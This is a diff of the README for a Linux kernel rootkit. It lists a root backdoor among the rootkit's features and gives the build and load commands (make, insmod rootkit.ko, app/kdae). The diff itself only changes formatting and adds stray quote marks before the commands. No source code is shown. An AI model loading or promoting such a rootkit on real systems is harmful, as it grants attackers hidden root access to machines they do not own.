@@ -1,6 +1,5 @@
 # Simple Linux kernel base rootkit
-
-A long time ago, i tested rootkit in 32bit Linux kernel 2.6.35 version.
+A long time ago, i tested rootkit in 32bit Linux kernel 2.6.35 version.<br>
 <br>
 <br>
 ### Rootkit skill
@@ -20,11 +19,12 @@ A long time ago, i tested rootkit in 32bit Linux kernel 2.6.35 version.
 4. Root backdoor<br>
 &nbsp;You can privilege escalation to root user.<br>
 <br>
+<br>
 ### Build
-&#35;make<br>
-&#35;cd app && make<br>
+"&#35;make<br>
+"&#35;cd app && make<br>
 <br>
 <br>
 ### Usage
-&#35;insmod rootkit.ko<br>
-&#35;app/kdae<br>
+"&#35;insmod rootkit.ko<br>
+"&#35;app/kdae<br>
